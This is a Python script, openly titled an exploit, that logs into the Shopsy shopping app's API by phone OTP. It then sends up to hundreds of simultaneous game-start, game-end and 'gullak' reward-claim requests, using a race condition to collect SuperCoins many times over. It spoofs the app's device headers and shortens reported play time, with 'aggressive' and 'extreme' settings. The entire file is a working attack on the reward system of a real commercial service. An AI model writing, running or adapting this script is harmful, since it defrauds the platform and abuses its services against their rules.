#!/usr/bin/env python3
"""
Parallel exploit with asyncio – 200+ parallel games possible!
Fresh login every run. No session saved.
Asks for parallel count per game individually.
"""

import sys
import time
import argparse
import asyncio
import aiohttp
import json
import uuid
from typing import Any, List, Dict, Optional
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path

# Import from auto_bot but we'll redefine needed functions to avoid dependency issues
try:
    from auto_bot import ShopsyClient, ShopsySession, LiveLog, login_flow, GAMES
except ImportError:
    # Fallback definitions if auto_bot is not available
    GAMES = [
        {"id": "runner-3d", "name": "Super Runner", "play_time": 94, "gems": 200},
        {"id": "city-builder", "name": "City Builder", "play_time": 47, "gems": 100},
        {"id": "match-3", "name": "Fruit Crush", "play_time": 35, "gems": 100},
        {"id": "goods-triple", "name": "Grocery Match", "play_time": 40, "gems": 100},
        {"id": "ludo", "name": "Ludo", "play_time": 50, "gems": 100},
        {"id": "nazaria", "name": "Nazar Pop", "play_time": 45, "gems": 100},
    ]
    
    class LiveLog:
        def __init__(self, debug: bool = False):
            self.debug = debug
            self.start = time.time()
        
        def _ts(self):
            return datetime.now().strftime("%H:%M:%S")
        
        def _elapsed(self):
            sec = int(time.time() - self.start)
            return f"{sec // 60:02d}:{sec % 60:02d}"
        
        def info(self, msg):
            print(f"[{self._ts()} | {self._elapsed()}] {msg}", flush=True)
        
        def ok(self, msg):
            print(f"[{self._ts()} | {self._elapsed()}] [+] {msg}", flush=True)
        
        def warn(self, msg):
            print(f"[{self._ts()} | {self._elapsed()}] [!] {msg}", flush=True)
        
        def dbg(self, msg, data=None):
            if not self.debug:
                return
            print(f"[{self._ts()} | {self._elapsed()}] [DEBUG] {msg}", flush=True)
            if data is not None:
                text = json.dumps(data, ensure_ascii=False, indent=2) if isinstance(data, (dict, list)) else str(data)
                if len(text) > 1200:
                    text = text[:1200] + "\n... (truncated)"
                print(text, flush=True)
        
        def countdown(self, label, seconds):
            for remaining in range(seconds, 0, -1):
                print(f"\r[{self._ts()} | {self._elapsed()}] {label} ... {remaining}s ", end="", flush=True)
                time.sleep(1)
            print(f"\r[{self._ts()} | {self._elapsed()}] {label} ... done!          ", flush=True)
    
    @dataclass
    class ShopsySession:
        device_id: str = field(default_factory=lambda: uuid.uuid4().hex)
        visit_id: str = field(default_factory=lambda: f"{uuid.uuid4().hex}-{int(time.time() * 1000)}")
        dc_id: str = "1"
        at: str = ""
        sn: str = ""
        vid: str = ""
        secure_token: str = ""
        secure_cookie: str = ""
        account_id: str = ""
        user_name: str = ""
        is_logged_in: bool = False
        
        def save(self):
            pass  # No-op for async version
        
        @classmethod
        def load(cls):
            return None
    
    class ShopsyClient:
        def __init__(self, log=None, fast=True):
            self.log = log or LiveLog()
            self.fast = fast
            self.ctx = ShopsySession()
            self._user_cache = None
        
        def _game_already_done(self, game_id, user):
            for g in user.get("gameStats", {}).get("games", []):
                if g.get("gameId") == game_id and g.get("rewards", {}).get("isMaxGameBonusEarned"):
                    return True
            return False
        
        def print_summary(self):
            print("\n" + "=" * 56)
            print("  SUPERCOIN SUMMARY")
            print("=" * 56)
            print(f"  Account: {self.ctx.account_id}")
            print(f"  DC: {self.ctx.dc_id}")
            print("=" * 56)


# ============================================================
#  CONFIGURABLE DEFAULTS
# ============================================================
DEFAULT_PARALLEL = 50      # Can go up to 1000+ with asyncio!
DEFAULT_START_SLEEP = 0.0
DEFAULT_BURST_DELAY = 0.0
DEFAULT_GULLAK = True
DEFAULT_ALL_GAMES = True
DEFAULT_SLOW = False
DEFAULT_DEBUG = True
# ============================================================


# ============================================================
#  HELPER FUNCTIONS - Redefined from auto_bot
# ============================================================
def _extract_dc_id(data: dict[str, Any], http_status: int) -> str | None:
    """Flipkart 406 DC Change -> extract new dc id."""
    is_dc = http_status == 406 or data.get("STATUS_CODE") == 406
    if not is_dc:
        return None
    if data.get("ERROR_MESSAGE") != "DC Change" and data.get("ERROR_CODE") != 2000:
        return None
    dc_info = (data.get("META_INFO") or {}).get("dcInfo") or data.get("RESPONSE") or {}
    dc_id = dc_info.get("id")
    return str(dc_id) if dc_id else None


ROME_TEMPLATE = "https://{dc}.rome.api.flipkart.net"
APP_VERSION = "2291175"
DEVICE_MODEL = "Pixel 9a"
DEVICE_BRAND = "Google"
DEFAULT_PINCODE = "226001"
FAST_PLAY_SEC = 18


class AsyncShopsyClient(ShopsyClient):
    """
    Async version of ShopsyClient - supports 200+ parallel requests
    """
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.ctx = ShopsySession()  # fresh
        self._user_cache = None
        self.ctx.save = lambda: None
        self.save = lambda: None
        self._session: Optional[aiohttp.ClientSession] = None
        self._last_dc_meta: dict[str, Any] | None = None
        
        # Sync methods from parent that we need
        self._sync_urls()
        self._partner_headers = self._partner_headers_impl
        self._game_headers = self._game_headers_impl
        self._path_from_url = self._path_from_url_impl

    async def __aenter__(self):
        # Create session with connection pooling for 200+ requests
        connector = aiohttp.TCPConnector(
            limit=0,  # No limit on connections
            limit_per_host=0,  # No limit per host
            ttl_dns_cache=300,
            enable_cleanup_closed=True
        )
        self._session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=30)
        )
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self._session:
            await self._session.close()

    # ========== Helper methods from ShopsyClient ==========
    def _sync_urls(self):
        self.base_url = ROME_TEMPLATE.format(dc=self.ctx.dc_id)

    def _url(self, path: str) -> str:
        return f"{self.base_url}{path}"

    @staticmethod
    def _path_from_url_impl(url: str) -> str:
        for path in ("/4/page/fetch", "/1/action/view", "/1/shopsy/games"):
            if path in url:
                return path
        if url.startswith("http"):
            idx = url.find("/", 8)
            return url[idx:] if idx != -1 else url
        return url

    def _partner_headers_impl(self, *, layout: bool = False) -> dict[str, str]:
        headers = {
            "User-Agent": "okhttp/4.9.2",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip",
            "X-PARTNER-CONTEXT": '{"source":"reseller"}',
            "FK-TENANT-ID": "SHOPSY",
            "business": "reseller",
            "X-User-Agent": self.x_user_agent,
            "X-Visit-Id": self.ctx.visit_id,
            "X-NewRelic-ID": "VwEHU1dSCxABUVlaAAQHU1UA",
        }
        if layout:
            headers["X-Layout-Version"] = '{"appVersion":"910000","frameworkVersion":"1.0"}'
        if self.ctx.at:
            headers["at"] = self.ctx.at
        if self.ctx.sn:
            headers["sn"] = self.ctx.sn
        if self.ctx.secure_token:
            headers["secureToken"] = self.ctx.secure_token
        if self.ctx.secure_cookie:
            headers["secureCookie"] = self.ctx.secure_cookie
        return headers

    def _game_headers_impl(self) -> dict[str, str]:
        return {
            "User-Agent": "okhttp/4.9.2",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip",
            "x-user-agent": self.x_user_agent,
            "sessionid": "session_id",
            "X-NewRelic-ID": "VwEHU1dSCxABUVlaAAQHU1UA",
        }

    @property
    def x_user_agent(self) -> str:
        return (
            f"Mozilla/5.0 (Linux; Android 15; {DEVICE_MODEL} Build/BD4A.250505.003) "
            f"FKUA/Retail/{APP_VERSION}/Android/Mobile "
            f"({DEVICE_BRAND}/{DEVICE_MODEL}/{self.ctx.device_id})"
        )

    def _switch_dc(self, dc_id: str) -> None:
        if self.ctx.dc_id == dc_id:
            return
        old = self.ctx.dc_id
        self.ctx.dc_id = dc_id
        self._sync_urls()
        self.ctx.save()
        self.log.info(f"DC Change: {old} -> {dc_id} | host={self.base_url}")

    def _capture_secure_cookie(self, response: aiohttp.ClientResponse) -> None:
        secure_cookie = response.headers.get("securecookie") or response.headers.get("secureCookie")
        if secure_cookie:
            self.ctx.secure_cookie = secure_cookie

    def _apply_session(self, data):
        session = data.get("SESSION") or {}
        if not session:
            return
        self.ctx.at = session.get("at") or self.ctx.at
        self.ctx.sn = session.get("sn") or self.ctx.sn
        self.ctx.vid = session.get("vid") or self.ctx.vid
        self.ctx.secure_token = session.get("secureToken") or self.ctx.secure_token
        self.ctx.account_id = session.get("accountId") or self.ctx.account_id
        self.ctx.is_logged_in = bool(session.get("isLoggedIn"))
        if session.get("firstName"):
            last = session.get("lastName") or ""
            self.ctx.user_name = f"{session['firstName']} {last}".strip()
        self.ctx.save()

    async def _post_json_async(
        self,
        url: str,
        payload: dict[str, Any],
        *,
        game: bool = False,
        layout: bool = False,
    ) -> dict[str, Any]:
        """Async version of _post_json"""
        path = self._path_from_url_impl(url)
        
        for attempt in range(5):
            active_url = self._url(path)
            headers = self._game_headers_impl() if game else self._partner_headers_impl(layout=layout)
            
            if self._session is None:
                raise RuntimeError("Session not initialized. Use 'async with' context manager.")
            
            try:
                self.log.dbg(f"POST {active_url} (dc={self.ctx.dc_id}, try={attempt + 1})", payload)
                async with self._session.post(active_url, json=payload, headers=headers) as response:
                    self._capture_secure_cookie(response)
                    data = await response.json()
                    
                    # Handle DC change
                    dc_id = _extract_dc_id(data, response.status)
                    if dc_id:
                        self._last_dc_meta = (data.get("META_INFO") or {}).get("dcInfo") or data.get("RESPONSE")
                        self._switch_dc(dc_id)
                        continue
                    
                    self.log.dbg(f"Response HTTP {response.status}", data)
                    
                    if not game:
                        self._apply_session(data)
                    
                    if response.status >= 400 or (data.get("STATUS_CODE") or 200) >= 400:
                        err = data.get("ERROR_MESSAGE") or data
                        raise RuntimeError(f"HTTP {response.status}: {err}")
                    
                    return data
                    
            except aiohttp.ClientError as e:
                if attempt == 4:
                    raise RuntimeError(f"Request failed after 5 attempts: {e}")
                await asyncio.sleep(1 * (attempt + 1))
                continue
        
        raise RuntimeError("Max retry attempts exceeded")

    async def bootstrap_async(self) -> None:
        """Async bootstrap"""
        self.log.info(f"Session bootstrap (DC {self.ctx.dc_id})...")
        payload = {
            "pageUri": "/shopsy2-login-page-store",
            "pageContext": {
                "pageHashKey": None,
                "slotContextMap": None,
                "paginationContextMap": None,
                "stateInfoMap": None,
                "slotIdInfoMap": None,
                "paginatedFetch": False,
                "pageNumber": 1,
                "fetchAllPages": False,
                "networkSpeed": 3000,
                "trackingContext": None,
                "fetchSeoData": False,
            },
            "partnerContext": None,
            "locationContext": {"pincode": DEFAULT_PINCODE},
            "requestContext": None,
        }
        data = await self._post_json_async(self._url("/4/page/fetch"), payload, layout=True)
        self.ctx.save()
        has_cookie = "yes" if self.ctx.secure_cookie else "no"
        self.log.ok(
            f"Bootstrap OK | dc={self.ctx.dc_id} | vid={self.ctx.vid or 'N/A'} | cookie={has_cookie}"
        )

    async def send_otp_async(self, phone: str) -> str:
        """Async OTP send"""
        phone = phone.strip().replace("+91", "").replace(" ", "")
        self.log.info(f"OTP bheja ja raha hai: +91{phone}")
        payload = {
            "actionRequestContext": {
                "type": "LOGIN_IDENTITY_VERIFY_SHOPSY2",
                "loginId": phone,
                "loginIdPrefix": "+91",
                "phoneNumberFormat": "E164",
                "addAppHash": True,
                "loginType": "MOBILE",
                "verificationType": "OTP",
                "sourceContext": "DEFAULT",
                "clientQueryParamMap": None,
            }
        }
        data = await self._post_json_async(self._url("/1/action/view"), payload)
        response_ctx = data.get("RESPONSE", {}).get("actionResponseContext", {})
        if not data.get("RESPONSE", {}).get("actionSuccess"):
            raise RuntimeError(f"OTP send fail: {data}")
        request_id = response_ctx.get("requestId")
        if not request_id:
            attempts = response_ctx.get("remainingAttempts")
            ctx_type = response_ctx.get("type", "")
            if attempts == 0 or ctx_type == "LOGIN_VERIFY":
                raise RuntimeError(
                    "OTP nahi bheja — galat number ya 24h limit. Sahi 10-digit number try karo."
                )
            raise RuntimeError(f"OTP requestId nahi mila: {response_ctx}")
        self.log.ok(f"OTP bhej diya | requestId={request_id[:12]}...")
        return request_id

    async def verify_otp_async(self, phone: str, otp: str, otp_request_id: str) -> None:
        """Async OTP verification"""
        phone = phone.strip().replace("+91", "").replace(" ", "")
        self.log.info("OTP verify ho raha hai...")
        payload = {
            "actionRequestContext": {
                "type": "LOGIN_SHOPSY2",
                "loginId": phone,
                "loginIdPrefix": "+91",
                "password": None,
                "otp": otp.strip(),
                "otpRequestId": otp_request_id,
                "remainingAttempts": 5,
                "phoneNumberFormat": "E164",
                "loginType": "MOBILE",
                "verificationType": "OTP",
                "sourceContext": "DEFAULT",
                "churned": False,
                "otpRegex": None,
                "data": None,
                "clientQueryParamMap": None,
            }
        }
        data = await self._post_json_async(self._url("/1/action/view"), payload)
        response_ctx = data.get("RESPONSE", {}).get("actionResponseContext", {})
        if not response_ctx.get("authenticationSuccess"):
            raise RuntimeError(f"Login fail: {data}")
        self.log.ok(f"Login OK | account={self.ctx.account_id} | name={self.ctx.user_name or 'User'}")

    async def games_api_async(self, route_uri: str, method: str, payload: dict[str, Any]) -> dict[str, Any]:
        """Async games API call"""
        body = {"requestMethod": method, "routeUri": route_uri, "payload": payload}
        return await self._post_json_async(self._url("/1/shopsy/games"), body, game=True)

    async def get_user_async(self, *, refresh: bool = False) -> dict[str, Any]:
        """Async get user"""
        if not self.ctx.account_id:
            raise RuntimeError("Account ID missing — pehle login karo")
        if self._user_cache and not refresh:
            return self._user_cache
        data = await self.games_api_async(
            "user/get-user",
            "GET",
            {"userId": self.ctx.account_id, "userName": self.ctx.user_name or "User"},
        )
        if not data.get("success"):
            raise RuntimeError(f"get-user fail: {data}")
        self._user_cache = data["data"]
        return self._user_cache

    async def start_game_async(self, game: dict[str, Any]) -> str:
        """Start a single game session asynchronously"""
        start = await self.games_api_async(
            "game/game-started",
            "POST",
            {"userId": self.ctx.account_id, "gameId": game["id"]},
        )
        if not start.get("success"):
            raise RuntimeError(f"Game start failed: {start}")
        return start["data"]["sessionId"]

    async def end_game_async(self, game: dict[str, Any], session_id: str, play_time: int) -> dict[str, Any]:
        """End a single game session asynchronously"""
        return await self.games_api_async(
            "game/game-ended",
            "POST",
            {
                "userId": self.ctx.account_id,
                "gameId": game["id"],
                "sessionId": session_id,
                "gemsEarned": game["gems"],
                "playTimeInSec": play_time,
            },
        )

    async def _play_seconds_async(self, game: dict[str, Any]) -> int:
        """Get play time (async version)"""
        if not self.fast:
            return game["play_time"]
        if game["play_time"] >= 60:
            return game["play_time"]
        return min(game["play_time"], FAST_PLAY_SEC)

    async def claim_gullak_async(self, label: str = "Gullak") -> dict[str, Any] | None:
        """Async gullak claim"""
        self.log.info(f"{label} claim (SuperCoin)...")
        data = await self.games_api_async(
            "gullak/claim-gullak",
            "POST",
            {"userId": self.ctx.account_id},
        )
        if not data.get("success"):
            err = data.get("data", {}).get("errorMessage") or data
            self.log.warn(f"{label} skip/fail: {err}")
            return None
        result = data["data"]
        self._user_cache = None
        self.log.ok(
            f"{label} | login={result.get('loginRewardCoinsClaimed', 0)} | "
            f"games={result.get('gameRewardCoinsClaimed', 0)} | "
            f"today={result.get('totalCoinsEarnedToday', 0)}"
        )
        return result


async def parallel_game_exploit_async(
    client: AsyncShopsyClient,
    game: dict[str, Any],
    parallel_count: int,
    start_sleep: float,
    burst_delay: float,
) -> int:
    """
    Async parallel game exploit - plays the same game N times in parallel
    """
    game_id = game["id"]
    name = game["name"]

    # Check if already done today
    user = await client.get_user_async(refresh=True)
    if client._game_already_done(game_id, user):
        client.log.warn(f"⏭️ {name} already done today. Skipping.")
        return 0

    play_time = await client._play_seconds_async(game)
    client.log.warn(f"🔥 GAME EXPLOIT: {name} × {parallel_count} parallel requests")

    # Start all sessions in parallel
    client.log.info(f"Starting {parallel_count} sessions for {name}...")
    start_tasks = []
    for i in range(parallel_count):
        start_tasks.append(client.start_game_async(game))
        if start_sleep > 0:
            await asyncio.sleep(start_sleep)
    
    # Wait for all sessions to start
    sessions = []
    start_results = await asyncio.gather(*start_tasks, return_exceptions=True)
    for i, result in enumerate(start_results):
        if isinstance(result, Exception):
            client.log.warn(f"Session {i} start failed: {result}")
        else:
            sessions.append(result)
    
    if not sessions:
        raise RuntimeError("No sessions could be started")

    # Wait for burst delay
    if burst_delay > 0:
        client.log.info(f"Waiting {burst_delay}s before burst...")
        await asyncio.sleep(burst_delay)

    client.log.info(f"Started {len(sessions)} sessions. Sending END requests in parallel...")

    # End all sessions in parallel
    end_tasks = [
        client.end_game_async(game, session, play_time)
        for session in sessions
    ]
    
    # Process results as they complete
    total_coins = 0
    success_count = 0
    
    for future in asyncio.as_completed(end_tasks):
        try:
            result = await future
            if result.get("success"):
                coins = result["data"].get("coinsEarnedForGame", 0)
                total_coins += coins
                success_count += 1
                client.log.ok(f"Session +{coins} coins")
            else:
                client.log.warn(f"Session failed: {result}")
        except Exception as e:
            client.log.warn(f"Session error: {e}")

    client._user_cache = None
    client.log.ok(
        f"✅ GAME EXPLOIT DONE: {success_count}/{len(sessions)} successful | "
        f"Total coins from this game: {total_coins}"
    )
    return total_coins


async def parallel_gullak_exploit_async(
    client: AsyncShopsyClient,
    parallel_count: int,
) -> int:
    """Async parallel gullak exploit"""
    client.log.warn(f"🔥 GULLAK EXPLOIT: {parallel_count} parallel claims")
    
    # Create all claim tasks
    tasks = [
        client.claim_gullak_async(f"Gullak {i+1}")
        for i in range(parallel_count)
    ]
    
    total_coins = 0
    success_count = 0
    
    for future in asyncio.as_completed(tasks):
        try:
            result = await future
            if result:
                coins = result.get("loginRewardCoinsClaimed", 0) + result.get("gameRewardCoinsClaimed", 0)
                total_coins += coins
                success_count += 1
        except Exception as e:
            client.log.warn(f"Gullak claim error: {e}")

    client.log.ok(f"GULLAK EXPLOIT: {success_count} claims, total coins: {total_coins}")
    return total_coins


async def run_all_games_async(
    client: AsyncShopsyClient,
    parallel_configs: Dict[str, int],
    start_sleep: float,
    burst_delay: float,
) -> int:
    """Run all games with their configured parallel counts"""
    total = 0
    for game in GAMES:
        game_id = game["id"]
        parallel_count = parallel_configs.get(game_id, DEFAULT_PARALLEL)
        
        if parallel_count <= 0:
            client.log.info(f"Skipping {game['name']} (0 parallel count)")
            continue
            
        try:
            coins = await parallel_game_exploit_async(
                client, game, parallel_count, start_sleep, burst_delay
            )
            total += coins
        except Exception as e:
            client.log.warn(f"Error on {game['name']}: {e}")
        
        # Small delay between games
        await asyncio.sleep(1)
    
    return total


def get_parallel_configs() -> Dict[str, int]:
    """
    Ask user for parallel count for each game individually
    """
    print("\n" + "=" * 56)
    print("  PARALLEL CONFIGURATION PER GAME")
    print("=" * 56)
    print("  Enter number of parallel sessions for each game.")
    print("  Press Enter to use default (50) or enter 0 to skip.")
    print("  Recommended: 5-20 for safety, 50-100 for aggressive")
    print("=" * 56)
    
    configs = {}
    
    for game in GAMES:
        game_id = game["id"]
        name = game["name"]
        
        while True:
            try:
                prompt = f"\n{name} ({game_id}) parallel count [default {DEFAULT_PARALLEL}]: "
                response = input(prompt).strip()
                
                if not response:
                    count = DEFAULT_PARALLEL
                else:
                    count = int(response)
                
                if count < 0:
                    print("❌ Count cannot be negative. Enter 0 to skip.")
                    continue
                
                configs[game_id] = count
                
                if count == 0:
                    print(f"⏭️ Skipping {name}")
                elif count <= 10:
                    print(f"🛡️ {name}: {count} sessions (Safe mode)")
                elif count <= 30:
                    print(f"⚖️ {name}: {count} sessions (Balanced mode)")
                elif count <= 100:
                    print(f"⚡ {name}: {count} sessions (Aggressive mode)")
                else:
                    print(f"💀 {name}: {count} sessions (Extreme mode!)")
                
                break
                
            except ValueError:
                print("❌ Please enter a valid number.")
    
    return configs


async def login_flow_async(client: AsyncShopsyClient, phone: str | None = None) -> None:
    """Async login flow"""
    await client.bootstrap_async()
    
    if not phone:
        phone = input("\nMobile number (+91): ").strip().replace("+91", "")
    
    if len(phone) != 10 or not phone.isdigit():
        raise ValueError("Valid 10-digit mobile number daalo")
    
    request_id = await client.send_otp_async(phone)
    otp = input("OTP enter karo: ").strip()
    
    if len(otp) != 6 or not otp.isdigit():
        raise ValueError("Valid 6-digit OTP daalo")
    
    await client.verify_otp_async(phone, otp, request_id)


async def main_async():
    parser = argparse.ArgumentParser(description="Shopsy parallel exploit with asyncio")
    parser.add_argument("--game", help="Game ID to exploit (default: all games)")
    parser.add_argument("--start-sleep", type=float, default=DEFAULT_START_SLEEP, 
                       help="Delay between starting sessions")
    parser.add_argument("--burst-delay", type=float, default=DEFAULT_BURST_DELAY,
                       help="Delay before firing end requests")
    parser.add_argument("--gullak", action="store_true", default=DEFAULT_GULLAK,
                       help="Also attempt parallel gullak claim")
    parser.add_argument("--slow", action="store_true", default=DEFAULT_SLOW,
                       help="Use full play time")
    parser.add_argument("--debug", action="store_true", default=DEFAULT_DEBUG)
    parser.add_argument("--non-interactive", action="store_true",
                       help="Skip interactive prompts (use defaults)")
    args = parser.parse_args()

    # Get parallel configs
    parallel_configs = {}
    
    if args.non_interactive:
        # Use defaults for all games
        for game in GAMES:
            parallel_configs[game["id"]] = DEFAULT_PARALLEL
    else:
        if args.game:
            # Only ask for the specified game
            game = next((g for g in GAMES if g["id"] == args.game), None)
            if not game:
                print(f"❌ Unknown game: {args.game}")
                print(f"Available: {[g['id'] for g in GAMES]}")
                return 1
            
            print(f"\nConfiguring parallel count for {game['name']} only...")
            while True:
                try:
                    response = input(f"Parallel count [default {DEFAULT_PARALLEL}]: ").strip()
                    count = int(response) if response else DEFAULT_PARALLEL
                    if count < 0:
                        print("❌ Count cannot be negative.")
                        continue
                    parallel_configs[args.game] = count
                    break
                except ValueError:
                    print("❌ Please enter a valid number.")
        else:
            # Ask for all games
            parallel_configs = get_parallel_configs()
    
    log = LiveLog(debug=args.debug)
    
    print("=" * 56)
    print("  SHOPSY ASYNC PARALLEL EXPLOIT")
    print(f"  Start sleep: {args.start_sleep}s")
    print(f"  Burst delay: {args.burst_delay}s")
    print("  Parallel configs:")
    for game_id, count in parallel_configs.items():
        game_name = next((g["name"] for g in GAMES if g["id"] == game_id), game_id)
        print(f"    {game_name}: {count} sessions")
    if args.gullak:
        print("  Gullak: YES")
    print("=" * 56)

    # Create and use async client
    async with AsyncShopsyClient(log=log, fast=not args.slow) as client:
        # Login
        phone = input("\nMobile number (+91): ").strip()
        await login_flow_async(client, phone)
        
        if not client.ctx.is_logged_in:
            log.warn("Login failed")
            return 1
        
        total_coins = 0
        
        # Run exploits
        if args.game:
            game = next((g for g in GAMES if g["id"] == args.game), None)
            if game:
                count = parallel_configs.get(args.game, 0)
                if count > 0:
                    total_coins += await parallel_game_exploit_async(
                        client, game, count, args.start_sleep, args.burst_delay
                    )
                else:
                    log.info(f"Skipping {game['name']} (0 parallel count)")
        else:
            total_coins += await run_all_games_async(
                client, parallel_configs, args.start_sleep, args.burst_delay
            )
        
        # Gullak exploit
        if args.gullak:
            gullak_threads = 10  # Cap at 10 for safety
            log.info(f"Running Gullak exploit with {gullak_threads} parallel claims")
            total_coins += await parallel_gullak_exploit_async(client, gullak_threads)
        
        # Summary
        client.print_summary()
        log.ok(f"Total extra coins earned today (approx): {total_coins}")
    
    return 0


def main():
    """Entry point"""
    try:
        return asyncio.run(main_async())
    except KeyboardInterrupt:
        print("\n[!] Cancelled")
        return 130
    except Exception as e:
        print(f"\n[!] Error: {e}")
        return 1


if __name__ == "__main__":
    sys.exit(main())